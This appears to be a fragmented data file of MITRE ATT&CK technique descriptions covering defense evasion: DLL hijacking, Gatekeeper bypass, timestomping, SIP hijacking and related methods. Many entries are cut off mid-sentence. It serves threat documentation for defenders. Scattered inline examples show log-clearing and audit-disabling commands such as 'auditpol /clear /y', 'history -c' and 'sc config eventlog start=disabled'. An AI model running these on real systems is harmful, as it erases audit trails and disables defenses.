        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

        InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)

      description: |-
        Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)

        Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)

      description: |-
        Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

        Specific ways DLLs are abused by adversaries include:

        ### DLL Sideloading
        Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

        Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

        Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

        Adversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. (Citation: Virus Bulletin) Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. (Citation: Sophos)

        ### DLL Search Order Hijacking
        Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

        ### DLL Redirection
        Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

        ### Phantom DLL Hijacking
        Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

        ### DLL Substitution
        Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

        Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

        Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

        If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.

      description: |-
        Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )

        Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:

        1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)

        2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.

        3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.

        4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.

        Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)

        Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).

        Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)

        Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).

        Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)

        Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.

        Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device.

      name: 'Indicator Removal on Host: Clear Command History'
      description: "In addition to clearing system logs, an adversary may clear the
        command history of a compromised account to conceal the actions undertaken
        during an intrusion. Various command interpreters keep track of the commands
        users type in their terminal so that users can retrace what they've done.\n\nOn
        Linux and macOS, these command histories can be accessed in a few different
        ways. While logged in, this command history is tracked in a file pointed to
        by the environment variable <code>HISTFILE</code>. When a user logs off a
        system, this information is flushed to a file in the user's home directory
        called <code>~/.bash_history</code>. The benefit of this is that it allows
        users to go back to commands they've used before in different sessions. Adversaries
        may delete their commands from these logs by manually clearing the history
        (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.
        \ \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        on network devices to clear command history data (<code>clear logging</code>
        and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers,
        command history may be manually removed from the `/var/log/shell.log` file.(Citation:
        Broadcom ESXi Shell Audit)\n\nOn Windows hosts, PowerShell has two different
        command history providers: the built-in history and the command history managed
        by the <code>PSReadLine</code> module. The built-in history only tracks the
        commands used in the current session. This command history is not available
        to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code>
        command history tracks the commands used in all PowerShell sessions and writes
        them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>
        by default). This history file is available to all sessions and contains all
        past history since the file is not deleted when the session ends.(Citation:
        Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell
        command <code>Clear-History</code> to flush the entire command history from
        a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code>
        file. Adversaries may also delete the <code>ConsoleHost_history.txt</code>
        file or edit its contents to hide PowerShell commands they have run.(Citation:
        Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History
        Forensics)"

      description: |-
        Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)

        Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.

        Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

        One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)

        Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

        Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)

      name: Thread Execution Hijacking
      description: "Adversaries may inject malicious code into hijacked processes
        in order to evade process-based defenses as well as possibly elevate privileges.
        Thread Execution Hijacking is a method of executing arbitrary code in the
        address space of a separate live process. \n\nThread Execution Hijacking is
        commonly performed by suspending an existing process then unmapping/hollowing
        its memory, which can then be replaced with malicious code or the path to
        a DLL. A handle to an existing victim process is first created with native
        Windows API calls such as <code>OpenThread</code>. At this point the process
        can be suspended then written to, realigned to the injected code, and resumed
        via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>,
        <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation:
        Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012)
        but targets an existing process rather than creating a process in a suspended
        state.  \n\nRunning code in the context of another process may allow access
        to the process's memory, system/network resources, and possibly elevated privileges.
        Execution via Thread Execution Hijacking may also evade detection from security
        products since the execution is masked under a legitimate process. "

      name: Traffic Signaling
      description: |-
        Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

        Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

        On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

        Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)

        Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.

        In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)

        Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)

        Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously.(Citation: Double Timestomping)

        In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)

        Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)

      name: Reflective Code Loading
      description: |-
        Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).

        Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)

        Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)

      description: |-
        Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)

        While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)

        In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)

        Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)

      description: "Adversaries may evade defensive mechanisms by executing commands
        that hide from process interrupt signals. Many operating systems use signals
        to deliver messages to control process behavior. Command interpreters often
        include specific commands/flags that ignore errors and other hangups, such
        as when the user of the active session logs off.(Citation: Linux Signal Man)
        \ These interrupt signals may also be used by defensive tools and/or analysts
        to pause or terminate specified running processes. \n\nAdversaries may invoke
        processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        `-ErrorAction SilentlyContinue`, or similar commands that may be immune to
        hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue)
        This may enable malicious commands and malware to continue execution through
        system events that would otherwise terminate its execution, such as users
        logging off or the termination of its C2 network connection.\n\nHiding from
        process interrupt signals may allow malware to continue execution, but unlike
        [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish
        [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will

        Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

        Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

        CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.

      description: |-
        Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

        The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Policies\Audit Policy</code> for basic audit policy settings or <code>Security Settings\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)

        Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)

        There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the "Start" value in the key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)

        Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)

        By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.

        Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

        Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)

        Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

        Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)

        as routers and firewalls that connect multiple networks together may implement
        NAT during the process of passing packets between networks. When performing
        NAT, the network device will rewrite the source and/or destination addresses
        of the IP address header. Some network designs require NAT for the packets
        to cross the border device.  A typical example of this is environments where
        internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen
        an adversary gains control of a network boundary device, they may modify NAT
        configurations to send traffic between two separated networks, or to obscure
        their activities.  In network designs that require NAT to function, such modifications
        enable the adversary to overcome inherent routing limitations that would normally
        prevent them from accessing protected systems behind the border device.  In
        network designs that do not require NAT, adversaries may use address translation
        to further obscure their activities, as changing the addresses of packets
        that traverse a network boundary device can make monitoring data transmissions
        more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
        to change the operating system of a network device, implementing their own
        custom NAT mechanisms to further obscure their activities."

      description: "Adversaries may modify a process's in-memory arguments to change
        its name in order to appear as a legitimate or benign process. On Linux, the
        operating system stores command-line arguments in the process’s stack and
        passes them to the `main()` function as the `argv` array. The first element,
        `argv[0]`, typically contains the process name or path - by default, the command
        used to actually start the process (e.g., `cat /etc/passwd`). By default,
        the Linux `/proc` filesystem uses this value to represent the process name.
        The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools
        like `ps` use it to display process information. Since arguments are stored
        in user-space memory at launch, this modification can be performed without
        elevated privileges. \n\nDuring runtime, adversaries can erase the memory
        used by all command-line arguments for a process, overwriting each argument
        string with null bytes. This removes evidence of how the process was originally
        launched. They can then write a spoofed string into the memory region previously
        occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`.
        The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed
        by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos

        along with one or more authentication factors (e.g., password, pin, physical
        smart card, token generator, etc.). Alternate authentication material is legitimately

        authentication material allows the system to verify an identity has successfully
        authenticated without asking the user to reenter authentication factor(s).
        Because the alternate authentication must be maintained by the system—either

      description: |-
        Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

        Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)

        Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.

        In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)

      description: |-
        Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)

        Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

        Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

        * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
        * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
        * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
        * **Note:** The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

        Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)

      description: "Adversaries may patch, modify, or otherwise backdoor cloud authentication
